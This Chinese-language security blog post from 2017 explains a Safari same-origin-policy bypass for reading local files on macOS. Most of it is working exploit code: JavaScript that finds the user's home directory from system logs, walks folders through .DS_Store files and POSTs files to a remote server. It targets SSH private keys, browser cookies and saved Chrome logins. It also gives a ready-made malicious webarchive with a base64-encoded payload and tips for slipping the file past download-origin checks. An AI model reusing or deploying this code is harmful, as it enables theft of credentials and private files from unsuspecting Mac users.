---
title: 绕过Safari同源策略，偷取本地文件
date: 2017-08-07 18:25:29
categories: Web安全
tags:
    - 同源策略
---

国外研究者[Bo0om](https://twitter.com/i_bo0om)公开了一种利用Safari同源策略绕过，读取本地文件并上传至远程服务器的攻击手法，并给出了PoC, 地址: [https://github.com/Bo0oM/Safiler](https://github.com/Bo0oM/Safiler)。一次有效的攻击，需要用户使用`Safari`浏览器`本地读取(file://)`恶意文档文件，因此攻击的范围是有限的，但是攻击手法中绕过同源策略和读取本地文件两种方式还是值得学习和研究的。

<!-- more -->
## Safari 同源策略绕过

受同源策略的限制，网页中用`XMLHttpRequest`对象读取本地文件是被禁止的，从错误信息中可以看出Safari浏览器跨源请求仅仅支持HTTP,但实际情况却并非如此。

{% asset_img 002.png %}

当Safari浏览器访问本地文件时，并不执行同源策略，用file协议打开一个HTML文件，包含在文件内的JavaScript代码可以绕过同源策略, 访问本地或远程文件。这样就可以做到读取本地文件，然后将文件内容发送给远程服务器了。

{% asset_img 003.png %}

这个问题15年就有报道过，至今苹果也没有处理，可能是，默认情况下javascript不能列举本地目录，影响范围有限。但是结合苹果系统自身的特性，利用`.DS_Store`文件来读取文件夹目录，这样攻击效果就很可观了，这也是本次介绍的攻击方式中一个值得研究的利用手段。

## 读取本地文件

`.DS_store`(Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。默认情况下，Mac OS X的Finder程序会在打开过的每个目录下创建.DS_Store文件(引自维基百科)。

从`.DS_store`文件中可以解析出当前目录中的所有的文件名，解析代码如下:

```python
#!/usr/bin/env python
from ds_store import DSStore
import json


path = './.DS_Store'

def parse(file):
    filelist = []
    for i in file:
        if i.filename != '.':
            filelist.append(i.filename)
    return list(set(filelist))


d = DSStore.open(path, 'r+')
fileresult = parse(d)
print(json.dumps(fileresult))
for name in fileresult:
    try:
        d = DSStore.open(path + name+ '/.DS_Store', 'r+')
        fileresult = parse(d)
        all.append(fileresult)
        print(json.dumps(fileresult))
    except:
        pass
```

运行: `python parse_ds.py`, 可以解析出当前目录下所有的文件名。

{% asset_img 004.png %}

苹果系统中有价值的数据基本都在用户目录下，而不同电脑的用户名是不一样的。如果不知道用户名，那么就难以用file协议读取用户目录中`.DS_store`文件的内容，攻击效果将大打折扣。苹果系统中`/etc/passwd`文件是不含用户名信息的，但是在`/var/log/system.log`和 `/var/log/install.log`这两个系统创建的日志信息中, 通常都包含了用户的路径信息，可以通过简单的正则表达式进行匹配。

```javascript
function getUser() {
    var xhr = new XMLHttpRequest();
    try {
        xhr.open('GET', '/var/log/system.log;/https:%2f%2fgoogle.com/', false);
        xhr.send();
        return xhr.responseText.match(//Users/w+//g)[0];
    } catch (e) {
        xhr.open('GET', '/var/log/install.log;/https:%2f%2fgoogle.com/', false);
        xhr.send();
        return xhr.responseText.match(//Users/w+//g)[0];
    }
}
```

这样就可以获取了完整的文件访问路径，结合`.DS_Store`文件内容获得文件和文件夹的层次结构。但是注意到，通常情况下只有用Finder打开的目录才会创建`.DS_Store`文件，而一些敏感文件目录通常是没有`.DS_Store`文件的，例如:`~/.ssh`。要获取这类的敏感文件，可以人为收集一些常见的敏感文件路径，弥补利用`.DS_Store`文件读取的不足。

常见的一些敏感文件路径有

```
~/.ssh/id_rsa;
~/.ssh/id_rsa.key;
~/.ssh/id_rsa.pub;
~/.ssh/known_hosts;
~/.ssh/authorized_keys

~/Library/Cookies/Cookies.binarycookies
~/Library/Cookies/com.apple.Safari.cookies

# 系统账户信息
~/Library/Accounts/Accounts4.sqlite

~/Library/Application Support/Google/Chrome/Default/Login Data
~/Library/Application Support/Google/Chrome/Default/Cookies
~/Library/Application Support/Google/Chrome/Default/History
```

## Safari打开恶意文档

Safari打开本地创建的恶意xhtm文件`PoC.xhtm`，本地开启一个服务器接收发送的文件内容, 并解析`.DS_Store`文件的内容返回给前端js继续读取本地文件，核心代码如下：

```javascript
function processFile(file) {
    let out = getFile(file),
        xhr = new XMLHttpRequest(),
        formData = new FormData()

    if (!out) return false;

    formData.append('file', out, file);

    xhr.open('POST', serverUrl);
    xhr.onreadystatechange = () => {
        if (xhr.readyState === 4 && xhr.status === 200 && xhr.responseText.length > 3) {
            let response = JSON.parse(xhr.responseText);

            response.forEach(responseFile => {
                let path = file.slice(0, file.lastIndexOf('/') + 1);
                if (processFile(path + responseFile) != true) {

                    processFile(path + responseFile + '/.DS_Store');
                }

            })
        }
    };
    xhr.send(formData);
    return true
}

function getUser() {
    var xhr = new XMLHttpRequest();

    try {
        xhr.open('GET', '/var/log/system.log;/https:%2f%2fgoogle.com/', false);
        xhr.send();
        var users = unique(xhr.responseText.match(/\/Users\/\w+\//g));
    } catch (e) {
        xhr.open('GET', '/var/log/install.log;/https:%2f%2fgoogle.com/', false);
        xhr.send();
        var users = unique(xhr.responseText.match(/\/Users\/\w+\//g));
    } finally {
        return users.find((userstring) => {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', userstring + '.DS_Store', false);
            xhr.send();
            return xhr.responseText.length > 0
        });
    }
}

function getFile(file) {
    var xhr = new XMLHttpRequest();

    try {
        console.log(file);
        xhr.open('GET', file + ';/https:%2f%2fgoogle.com/', false);
        xhr.responseType = 'blob';
        xhr.send();

        if (xhr.response.size != 0) return xhr.response


    } catch (e) {
        console.log(e)
    }
}
```

{% asset_img 005.png %}

打开这种本地创建的文件，可以看出攻击是有效的,文件内容会被存储到远程服务器上。

如果文档不是用Safari打开的，而是用其他浏览器打开本地的HTML文档，如Chrome或Firefox, 那么什么也不会发生，幸运的是, 存在一种默认情况下用Safari浏览器打开的文件格式webarchive, webarchive文件是设计为在mscOS和windows系统上用Safari浏览器预览或保存网页，其格式不同于标准的HTML文件格式。设计一个恶意的webarchive格式文件如下

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>WebMainResource</key>
	<dict>
		<key>WebResourceData</key>
		<data>	PHNjcmlwdD5jb25zdCBzZXJ2ZXJVcmw9J2h0dHA6Ly8wOjUwMDAnLHVzZXI9Z2V0VXNlcigpLGxpc3Q9Wycuc3NoL2lkX3JzYScsJy5zc2gva25vd25faG9zdHMnLCcuc3NoL2F1dGhvcml6ZWRfa2V5cycsJy5iYXNoX2hpc3RvcnknLCdMaWJyYXJ5L0Nvb2tpZXMvQ29va2llcy5iaW5hcnljb29raWVzJywnTGlicmFyeS9Db29raWVzL0hTVFMucGxpc3QnLCdMaWJyYXJ5L0Nvb2tpZXMvY29tLmFwcGxlLlNhZmFyaS5jb29raWVzJywnTGlicmFyeS9BY2NvdW50cy9BY2NvdW50czQuc3FsaXRlJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0Nocm9taXVtL0RlZmF1bHQvTG9naW4gRGF0YScsJ0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9DaHJvbWl1bS9EZWZhdWx0L0Nvb2tpZXMnLCdMaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvQ2hyb21pdW0vRGVmYXVsdC9IaXN0b3J5JywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Mb2dpbiBEYXRhJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Db29raWVzJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9IaXN0b3J5JywnLlRyYXNoLy5EU19TdG9yZScsJ0RvY3VtZW50cy8uRFNfU3RvcmUnLCdEZXNrdG9wLy5EU19TdG9yZScsXS5tYXAoZmlsZT0+dXNlcisgZmlsZSk7bWFpbigpO2Z1bmN0aW9uIG1haW4oKXtsaXN0LmZvckVhY2gocHJvY2Vzc0ZpbGUpO30KZnVuY3Rpb24gdW5pcXVlKGFycil7dmFyIG9iaj17fTtmb3IodmFyIGk9MDtpPGFyci5sZW5ndGg7aSsrKXt2YXIgc3RyPWFycltpXTtvYmpbc3RyXT10cnVlO30KcmV0dXJuIE9iamVjdC5rZXlzKG9iaik7fQpmdW5jdGlvbiBwcm9jZXNzRmlsZShmaWxlKXtsZXQgb3V0PWdldEZpbGUoZmlsZSkseGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpLGZvcm1EYXRhPW5ldyBGb3JtRGF0YSgpCmlmKCFvdXQpcmV0dXJuIGZhbHNlO2Zvcm1EYXRhLmFwcGVuZCgnZmlsZScsb3V0LGZpbGUpO3hoci5vcGVuKCdQT1NUJyxzZXJ2ZXJVcmwpO3hoci5vbnJlYWR5c3RhdGVjaGFuZ2U9KCk9PntpZih4aHIucmVhZHlTdGF0ZT09PTQmJnhoci5zdGF0dXM9PT0yMDAmJnhoci5yZXNwb25zZVRleHQubGVuZ3RoPjMpe2xldCByZXNwb25zZT1KU09OLnBhcnNlKHhoci5yZXNwb25zZVRleHQpO3Jlc3BvbnNlLmZvckVhY2gocmVzcG9uc2VGaWxlPT57bGV0IHBhdGg9ZmlsZS5zbGljZSgwLGZpbGUubGFzdEluZGV4T2YoJy8nKSsgMSk7aWYocHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKSE9dHJ1ZSl7cHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKycvLkRTX1N0b3JlJyk7fX0pfX07eGhyLnNlbmQoZm9ybURhdGEpO3JldHVybiB0cnVlfQpmdW5jdGlvbiBnZXRVc2VyKCl7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTt0cnl7eGhyLm9wZW4oJ0dFVCcsJ2ZpbGU6Ly8vdmFyL2xvZy9zeXN0ZW0ubG9nOy9odHRwczolMmYlMmZnb29nbGUuY29tLycsZmFsc2UpO3hoci5zZW5kKCk7dmFyIHVzZXJzPXVuaXF1ZSh4aHIucmVzcG9uc2VUZXh0Lm1hdGNoKC9cL1VzZXJzXC9cdytcLy9nKSk7fWNhdGNoKGUpe3hoci5vcGVuKCdHRVQnLCdmaWxlOi8vL3Zhci9sb2cvaW5zdGFsbC5sb2c7L2h0dHBzOiUyZiUyZmdvb2dsZS5jb20vJyxmYWxzZSk7eGhyLnNlbmQoKTt2YXIgdXNlcnM9dW5pcXVlKHhoci5yZXNwb25zZVRleHQubWF0Y2goL1wvVXNlcnNcL1x3K1wvL2cpKTt9ZmluYWxseXtyZXR1cm4gdXNlcnMuZmluZCgodXNlcnN0cmluZyk9Pnt2YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLHVzZXJzdHJpbmcrJy5EU19TdG9yZScsZmFsc2UpO3hoci5zZW5kKCk7cmV0dXJuIHhoci5yZXNwb25zZVRleHQubGVuZ3RoPjB9KTt9fQpmdW5jdGlvbiBnZXRGaWxlKGZpbGUpe3ZhciB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7dHJ5e2NvbnNvbGUubG9nKGZpbGUpO3hoci5vcGVuKCdHRVQnLGZpbGUrJzsvaHR0cHM6JTJmJTJmZ29vZ2xlLmNvbS8nLGZhbHNlKTt4aHIucmVzcG9uc2VUeXBlPSdibG9iJzt4aHIuc2VuZCgpO2lmKHhoci5yZXNwb25zZS5zaXplIT0wKXJldHVybiB4aHIucmVzcG9uc2V9Y2F0Y2goZSl7Y29uc29sZS5sb2coZSl9fQo8L3NjcmlwdD4=
		</data>
		<key>WebResourceFrameName</key>
		<string></string>
		<key>WebResourceMIMEType</key>
		<string>text/html</string>
		<key>WebResourceTextEncodingName</key>
		<string>UTF-8</string>
		<key>WebResourceURL</key>
		<string>file://</string>
	</dict>
</dict>
</plist>
```

上面data中的base64数据解码就是一段恶意的javascript脚本。

### 网络传播xhtm文件

是不是只要Safari本地打开类似xhtm恶意文档，攻击都能生效呢？结果并不是，macOS文件是有属性信息的，从网上下载的文件会有来源信息， 如: `http://127.0.0.1:8000/Poc.xhtm`, 本地打开这种文件，攻击并不生效。

{% asset_img 006.png %}

可见，打开带网络来源属性的的文件，会被Safari的同源策略拦截，导致攻击不能生效，那么通过邮件发送恶意文件再本地打开的方式，也是难以成功了。

那么是不是没有办法进行网络传播了呢，答案是否定的，macOS上的应用并不是都会保留文件的网络属性。

* 文件压缩

  macOS自带的解压工具解压文件仍旧会保留网络属性，但是第三方应用如:`Entropy`解压文件会丢失网络属性，然后用Safari本地打开可导致攻击成功。那么可以将文件压缩为macOS自带解压工具解压不了的格式，如: 7z, rar等，然后通过网络下载或邮件进行传播。

* 社交软件传播

  使用微信和QQ接收文件，仍旧会保留网络属性，无法成功利用

感谢wupco，给出了一种可以用来网络传播html文档进行攻击的方式，利用iframe下载webarchive文件后本地读取webarchive文件进行攻击的方式。

```html
<html>
<head>
</head>
<body>
test
<script>
    function exp(){
      var iframe2 = document.createElement('iframe');
            iframe2.src="./PoC0.webarchive";
            document.body.appendChild(iframe2);
    }

    var iframe = document.createElement('iframe');
    iframe.src="http://0:8000/PoC0.webarchive";
    document.body.appendChild(iframe);
    setTimeout("exp()",1500);
</script>
</body>
</html>
```

### 网络传播webarchive文件

测试发现，通过网页或邮件等方式下载到本地的webarchive文件，用Safari打开，攻击是有效的。 唯一不足的是Safari会弹一个警示框显示文件是网络下载的，需要用户确认才能打开。

{% asset_img 007.png %}

## 防御

针对这种攻击，有效的防御就是不要使用Safari浏览器打开本地文件, 不要将默认浏览器设置为Safari, 修改为Chrome等浏览器。

## Ref

*  [https://xakep.ru/2017/07/06/safari-localfile-read/](https://xakep.ru/2017/07/06/safari-localfile-read/)
*  [https://lab.wallarm.com/hunting-the-files-34caa0c1496](https://lab.wallarm.com/hunting-the-files-34caa0c1496)
*  [http://resources.infosecinstitute.com/bypassing-same-origin-policy-sop-part-2/#article](http://resources.infosecinstitute.com/bypassing-same-origin-policy-sop-part-2/#article)
*  [https://www.ifshow.com/detailed-and-bypass-the-same-origin-policy/](https://www.ifshow.com/detailed-and-bypass-the-same-origin-policy/)
